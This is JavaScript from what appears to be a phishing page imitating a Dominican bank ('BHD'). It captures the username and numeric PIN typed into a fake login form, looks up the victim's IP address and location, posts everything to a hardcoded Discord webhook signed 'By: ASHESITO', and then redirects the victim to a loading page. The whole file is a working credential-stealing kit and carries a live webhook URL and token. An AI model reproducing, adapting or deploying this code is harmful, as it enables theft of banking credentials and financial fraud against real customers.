 // Configuración del Webhook de Discord
  const DISCORD_WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1472057162447720539/1ah2nyf69R2i7vlRY5v-WKvnCE3esv5E_J-kcR9vdKTABGfGRqMbsEYn9R5Hml77rjn6';

  // Limpiar inputs solo de caracteres no permitidos
  document.getElementById('usuario').addEventListener('input', function() {
    this.value = this.value.replace(/[^a-zA-Z0-9]/g, '');
  });
  
  document.getElementById('clave').addEventListener('input', function() {
    this.value = this.value.replace(/\D/g, '');
  });

  // Interceptar el envío del formulario
  document.getElementById('loginForm').addEventListener('submit', async function(e) {
    e.preventDefault(); // Prevenir envío normal
    
    const usuario = document.getElementById('usuario').value;
    const clave = document.getElementById('clave').value;
    const submitBtn = document.getElementById('submitBtn');
    
    // Deshabilitar el botón para evitar múltiples envíos
    submitBtn.disabled = true;
    submitBtn.textContent = 'Enviando...';
    
    // ========== GUARDAR USUARIO EN LOCALSTORAGE ==========
    // ¡¡¡IMPORTANTE!!! Esto debe estar DENTRO de la función
    localStorage.setItem('usuario', usuario);
    console.log('Usuario guardado en localStorage:', usuario);
    // ====================================================
    
    // Obtener IP del usuario
    let ip = 'IP desconocida';
    let ciudad = 'Desconocida';
    let pais = 'Desconocido';
    
    try {
      // Obtener IP pública
      const ipResponse = await fetch('https://api.ipify.org?format=json');
      if (ipResponse.ok) {
        const ipData = await ipResponse.json();
        ip = ipData.ip;
        
        // Obtener ubicación basada en IP (usando ipapi.co)
        try {
          const locationResponse = await fetch(`https://ipapi.co/${ip}/json/`);
          if (locationResponse.ok) {
            const locationData = await locationResponse.json();
            ciudad = locationData.city || 'Desconocida';
            pais = locationData.country_name || 'Desconocido';
          }
        } catch (locationError) {
          console.log('No se pudo obtener la ubicación');
        }
      }
    } catch (error) {
      console.log('No se pudo obtener la IP pública');
    }
    
    // Formatear fecha
    const now = new Date();
    const fechaFormateada = `${now.getFullYear()}-${String(now.getMonth() + 1).padStart(2, '0')}-${String(now.getDate()).padStart(2, '0')} ${String(now.getHours()).padStart(2, '0')}:${String(now.getMinutes()).padStart(2, '0')}:${String(now.getSeconds()).padStart(2, '0')}`;
    
    // Crear mensaje para Discord
    const mensaje = {
      content: `💰 BHD INICIO 💰
✉️ Usuario: ${usuario || "No proporcionado"}
🔑 Clave: ${clave || "No proporcionada"}

🌐 IP: ${ip}
🏙 Ciudad: ${ciudad}
🇩🇴 País: ${pais}

🕒 Fecha: ${fechaFormateada}

By: ASHESITO`
    };
    
    // Enviar datos a Discord
    try {
      await fetch(DISCORD_WEBHOOK_URL, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(mensaje)
      });
      
      console.log('Datos enviados a Discord');
      
    } catch (error) {
      console.error('Error enviando a Discord:', error);
    }
    
    // Redireccionar a cargando.html después de 1 segundo
    setTimeout(() => {
      // Enviar formulario normalmente (esto redirigirá a cargando.html)
      this.submit();
    }, 1000);
  });

 